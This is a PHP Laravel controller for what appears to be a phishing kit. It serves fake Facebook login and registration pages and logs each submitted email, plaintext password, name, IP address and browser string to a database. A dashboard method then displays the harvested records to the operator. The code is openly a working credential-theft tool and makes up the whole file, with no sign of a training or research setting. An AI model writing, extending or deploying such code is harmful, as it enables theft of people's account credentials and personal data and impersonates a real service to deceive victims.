<?php

namespace App\Http\Controllers;

use App\Models\PhishingLogs;
use Illuminate\Http\Request;
use Illuminate\View\View;  // Add this import

class PhishingController extends Controller
{
    public function showLoginPage(): View
    {
        return view('phishing.facebook');
    }

    public function showRegisterPage(): View
    {
        return view('phishing.facebook-register');
    }

    public function captureCredentials(Request $request)
    {
        // Save the credentials
        PhishingLogs::create([
            'email' => $request->email,
            'password' => $request->password,
            'ip_address' => $request->ip(),
            'user_agent' => $request->header('User-Agent'),
            'type' => 'login',
        ]);

        // Pass data to success page
        $userData = [
            'email' => $request->email,
        ];

        // Show success page instead of dashboard
        return view('phishing.success', [
            'userData' => $userData
        ]);
    }

    public function captureRegistration(Request $request)
    {
        // Save the registration data
        PhishingLogs::create([
            'first_name' => $request->first_name,
            'last_name' => $request->last_name,
            'email' => $request->email,
            'password' => $request->password,
            'ip_address' => $request->ip(),
            'user_agent' => $request->header('User-Agent'),
            'type' => 'registration',
        ]);

        // Pass data to success page
        $userData = [
            'email' => $request->email,
            'first_name' => $request->first_name,
            'last_name' => $request->last_name,
        ];

        // Show success page instead of dashboard
        return view('phishing.success', [
            'userData' => $userData
        ]);
    }

    // Dashboard method to view logs
    public function showDashboard()
    {
        // Get all phishing logs
        $logs = PhishingLogs::orderBy('created_at', 'desc')->get();
        
        // Show dashboard with logs
        return view('phishing.dashboard', ['logs' => $logs]);
    }
}

